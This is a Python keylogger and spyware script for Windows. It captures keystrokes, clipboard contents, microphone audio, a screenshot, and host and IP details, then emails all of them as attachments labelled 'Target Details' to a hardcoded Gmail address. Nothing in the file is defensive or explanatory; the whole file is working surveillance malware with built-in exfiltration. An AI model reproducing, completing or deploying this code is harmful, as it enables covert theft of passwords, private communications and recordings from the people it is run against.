import socket
import platform
import win32clipboard
import datetime
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from requests import get, RequestException
from PIL import ImageGrab
import multiprocessing
from time import perf_counter
from mail_support import authenticateGmailAPIs, send_mail


def get_system_information(path):
    with open(path, "w") as f:
        host_name = socket.gethostname()
        IP = socket.gethostbyname(host_name)

        f.write("System: " + platform.system() + " " + platform.version())
        f.write("\nMachine: " + platform.machine())
        f.write("\nProcessor: " + platform.processor())
        f.write("\nHostname: " + host_name)
        f.write("\nPrivate IP Address: " + IP)

        try:
            pub_ip = get("https://api.ipify.org").text
            f.write("\nPublic IP Address: " + pub_ip)
        except RequestException:
            f.write("\nPublic IP Address: Could not retrieve public ip address")


def get_clipboard(path):
    with open(path, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            f.write("Clipboard Data:\n\n" + data)
        except TypeError:
            f.write("\nNon-text information found in clipboard!!")
        finally:
            win32clipboard.CloseClipboard()


def get_microphone(path,mic_act):
    sf = 44100
    seconds = mic_act
    recording = sd.rec(int(seconds * sf), samplerate=sf, channels=2)
    sd.wait()
    write(path, sf, recording)


def grab_screenshot(path):
    img = ImageGrab.grab()
    img.save(path)


def on_press(key):
    global keys, count

    k = str(key).replace("'","")
    keys.append(k)
    count += 1
    # print(keys)

    if count >= 1:
        count = 0
        write_to_list(keys)
        keys = []


def write_to_list(_keys):
    global log_list,fn_key_list,lookup_num

    for key in _keys:
        if key.find("shift") > 0 or key.find("esc") > 0 or key.find("ctrl") > 0 or key.find("alt") > 0 \
                or key.find("cmd") > 0:
            pass
        elif key.find("up") > 0 or key.find("down") > 0 or key.find("left") > 0 or key.find("right") > 0:
            pass
        elif key.find("backspace") > 0:
            log_list = log_list[:-1]
        elif key.find("enter") > 0:
            log_list.append("\n")
        elif key.find("space") > 0:
            log_list.append(" ")
        elif key.find("tab") > 0:
            log_list.append("\t")
        elif key.find("caps_lock") > 0 or key.find("num_lock") > 0 or key.find("scroll_lock") > 0:
            pass
        elif key.find("menu") > 0 or key.find("insert") > 0 or key.find("end") > 0 or key.find("page_") > 0 or \
                key.find("delete") > 0 or key.find("home") > 0 or key.find("print_screen") > 0 or \
                key.find("pause") > 0 or key.find("media_") > 0:
            pass
        elif key in fn_key_list:
            pass
        elif key.find('""') >= 0:
            log_list.append("\'")
        elif key.find("\\\\") >= 0:
            log_list.append("\\")
        elif key == "<12>":
            pass
        elif key == "<110>":
            log_list.append(".")
        elif key in lookup_num:
            log_list.append(lookup_num.get(key))
        else:
            log_list.append(key)


def on_release(key):
    # global prev
    if key == Key.esc:
        dt_end = datetime.datetime.now()
        with open(file_path + extend + key_info, "a") as f:
            f.writelines(log_list)
            f.write(f"\n\nLogging Terminated> {dt_end.day}/{dt_end.month}/{dt_end.year} | {dt_end.hour}:"
                    f"{dt_end.minute}:{dt_end.second}\n")
            f.close()
        # print(log_list)

        send_mail(to_address, from_address, "Target Details", "Take a look at the information acquired!!",
                  attachments,authenticateGmailAPIs())

        return False

    """
        curr = time.time()
        diff = curr - prev
        prev = curr
        if diff > 5:
            # print("exceeded 5 sec(s)")
            with open(file_path + extend + key_info, "a") as f:
                f.writelines(log_list)
                f.close()
                log_list.clear()
        """


if __name__ == "__main__":
    start = perf_counter()
    file_path = "C:\\Users\\Varun\\PycharmProjects\\keylogger"
    extend = "\\"

    key_info = "log.txt"
    system_info = "sys_info.txt"
    clipboard_info = "clipboard.txt"

    audio_info = "audio.wav"
    microphone_activate = 5

    ss_info = "grab.png"

    from_address = '2112.vas.1803@gmail.com'
    to_address = '2112.vas.1803@gmail.com'

    attachments = [file_path + extend + key_info,
                   file_path + extend + system_info,
                   file_path + extend + clipboard_info,
                   file_path + extend + audio_info,
                   file_path + extend + ss_info]

    count = 0
    keys = []

    log_list = []
    fn_key_list = ['Key.f1', 'Key.f2', 'Key.f3', 'Key.f4', 'Key.f5', 'Key.f6',
                   'Key.f7', 'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', '<255>']
    lookup_num = {
        '<96>': '0',
        '<97>': '1',
        '<98>': '2',
        '<99>': '3',
        '<100>': '4',
        '<101>': '5',
        '<102>': '6',
        '<103>': '7',
        '<104>': '8',
        '<105>': '9'
    }

    dt_beg = datetime.datetime.now()
    with open(file_path + extend + key_info, "w") as fp:
        fp.write(f"Logging Started> {dt_beg.day}/{dt_beg.month}/{dt_beg.year} | {dt_beg.hour}"
                 f":{dt_beg.minute}:{dt_beg.second}\n\n")
        fp.close()

    # prev = time.time()
    ls = Listener(on_press=on_press, on_release=on_release)
    ls.start()

    p1 = multiprocessing.Process(target=get_system_information,args=(file_path + extend + system_info,),daemon=True)
    p2 = multiprocessing.Process(target=get_clipboard,args=(file_path + extend + clipboard_info,),daemon=True)
    p3 = multiprocessing.Process(target=get_microphone,args=(file_path + extend + audio_info,microphone_activate),
                                 daemon=True)
    p4 = multiprocessing.Process(target=grab_screenshot,args=(file_path + extend + ss_info,),daemon=True)

    p1.start()
    p2.start()
    p3.start()
    p4.start()

    ls.join()

    end = perf_counter()

    print(f"Done in {end-start} second(s)")
